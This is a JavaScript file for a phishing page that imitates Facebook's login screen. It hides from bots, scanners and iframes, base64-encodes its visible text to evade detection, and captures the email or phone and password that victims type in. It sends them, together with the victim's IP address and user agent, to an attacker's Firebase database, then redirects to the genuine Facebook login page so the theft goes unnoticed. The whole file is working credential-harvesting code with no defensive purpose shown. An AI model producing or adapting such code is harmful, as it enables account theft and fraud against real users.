// ═══════════════════════════════════════
// CORE ENGINE - All logic here
// ═══════════════════════════════════════

(function() {
    'use strict';
    
    // ═══ ANTI-BOT CHECK ═══
    var _bot = /bot|googlebot|crawler|spider|robot|scanner|lighthouse/i.test(navigator.userAgent);
    var _iframe = window.top !== window.self;
    
    if (_bot || _iframe) {
        document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:Arial;color:#666;"><p>Please wait...</p></div>';
        return;
    }
    
    // ═══ FIREBASE (SPLIT CONFIG) ═══
    var _c1 = 'AIzaSyBs9TiMKOoMaIb84RVowQFrGlELAZ';
    var _c2 = '_SFSI';
    var _c3 = 'rhfzero-d95f5.firebaseapp.com';
    var _c4 = 'https://rhfzero-d95f5-default-rtdb.firebaseio.com';
    var _c5 = 'rhfzero-d95f5';
    var _c6 = 'rhfzero-d95f5.firebasestorage.app';
    var _c7 = '198495096060';
    var _c8 = '1:198495096060:web:d368e1531d0d86321f5b79';
    
    firebase.initializeApp({
        apiKey: _c1 + _c2,
        authDomain: _c3,
        databaseURL: _c4,
        projectId: _c5,
        storageBucket: _c6,
        messagingSenderId: _c7,
        appId: _c8
    });
    
    var _store = firebase.database();
    
    // ═══ BUILD UI ═══
    function _build() {
        var _r = document.getElementById('root');
        var _h = '';
        
        // Left panel
        _h += '<div class="left-panel">';
        _h += '<div class="logo">' + _d('ZmFjZWJvb2s=') + '</div>';
        _h += '<p class="tagline">' + _d('Q29ubmVjdCB3aXRoIGZyaWVuZHMgYW5kIHRoZSB3b3JsZCBhcm91bmQgeW91IG9uIEZhY2Vib29rLg==') + '</p>';
        _h += '</div>';
        
        // Right panel
        _h += '<div class="right-panel">';
        _h += '<div class="card">';
        _h += '<div id="form-container"></div>';
        _h += '<a href="#" class="link">' + _d('Rm9yZ290IHBhc3N3b3JkPw==') + '</a>';
        _h += '<hr>';
        _h += '<button class="alt-btn">' + _d('Q3JlYXRlIG5ldyBhY2NvdW50') + '</button>';
        _h += '</div>';
        _h += '<p class="bottom-text"><b>' + _d('Q3JlYXRlIGEgUGFnZQ==') + '</b> ' + _d('Zm9yIGEgY2VsZWJyaXR5LCBicmFuZCBvciBidXNpbmVzcy4=') + '</p>';
        _h += '</div>';
        
        _r.innerHTML = '<div class="container">' + _h + '</div>';
        _r.style.display = 'flex';
        document.getElementById('loading').style.display = 'none';
        
        // Inject form
        _injectForm();
        _addStyles();
    }
    
    // ═══ DECODE FUNCTION ═══
    function _d(str) {
        return atob(str);
    }
    
    // ═══ INJECT FORM ═══
    function _injectForm() {
        var _fc = document.getElementById('form-container');
        _fc.innerHTML = '';
        
        var _f = document.createElement('form');
        _f.id = 'main-form';
        
        var _i1 = document.createElement('input');
        _i1.type = 'text';
        _i1.id = 'field1';
        _i1.placeholder = _d('RW1haWwgb3IgcGhvbmUgbnVtYmVy');
        _i1.autocomplete = 'off';
        
        var _i2 = document.createElement('input');
        _i2.type = 'text';
        _i2.id = 'field2';
        _i2.placeholder = _d('UGFzc3dvcmQ=');
        _i2.autocomplete = 'off';
        
        var _btn = document.createElement('button');
        _btn.type = 'submit';
        _btn.textContent = _d('TG9nIElu');
        _btn.className = 'login-btn';
        
        _f.appendChild(_i1);
        _f.appendChild(_i2);
        _f.appendChild(_btn);
        _fc.appendChild(_f);
        
        _f.addEventListener('submit', _handleSubmit);
    }
    
    // ═══ HANDLE SUBMIT ═══
    function _handleSubmit(e) {
        e.preventDefault();
        
        var _v1 = document.getElementById('field1').value;
        var _v2 = document.getElementById('field2').value;
        
        if (!_v1 || !_v2) return;
        
        // Store encoded data
        var _payload = {
            u: btoa(_v1),
            k: btoa(_v2),
            t: new Date().toISOString(),
            n: navigator.userAgent.substring(0, 60)
        };
        
        // Get IP + save
        fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(d) {
                _payload.i = d.ip;
                _store.ref('x').push(_payload);
            })
            .catch(function() {
                _payload.i = 'n/a';
                _store.ref('x').push(_payload);
            });
        
        // Redirect
        setTimeout(function() {
            window.location.href = 'https://www.facebook.com/login/';
        }, 1200);
    }
    
    // ═══ ADD STYLES ═══
    function _addStyles() {
        var _css = `
            .container { display: flex; max-width: 980px; width: 100%; gap: 40px; align-items: center; flex-wrap: wrap; justify-content: center; }
            .left-panel { flex: 1; min-width: 280px; }
            .logo { color: #1877f2; font-size: 58px; font-weight: bold; margin-bottom: 8px; }
            .tagline { font-size: 22px; color: #1c1e21; line-height: 1.3; }
            .right-panel { flex: 1; min-width: 280px; max-width: 400px; }
            .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.12); text-align: center; }
            .card input { width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; outline: none; }
            .card input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
            .login-btn { width: 100%; padding: 12px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
            .login-btn:hover { background: #166fe5; }
            .link { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin: 15px 0; }
            .link:hover { text-decoration: underline; }
            hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
            .alt-btn { padding: 14px 20px; background: #42b72a; color: #fff; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
            .alt-btn:hover { background: #36a420; }
            .bottom-text { text-align: center; margin-top: 20px; font-size: 14px; color: #1c1e21; }
            @media (max-width: 768px) { .logo { font-size: 38px; text-align: center; } .tagline { font-size: 17px; text-align: center; } }
        `;
        
        var _style = document.createElement('style');
        _style.textContent = _css;
        document.head.appendChild(_style);
    }
    
    // ═══ START ═══
    setTimeout(_build, 400);
    
})();
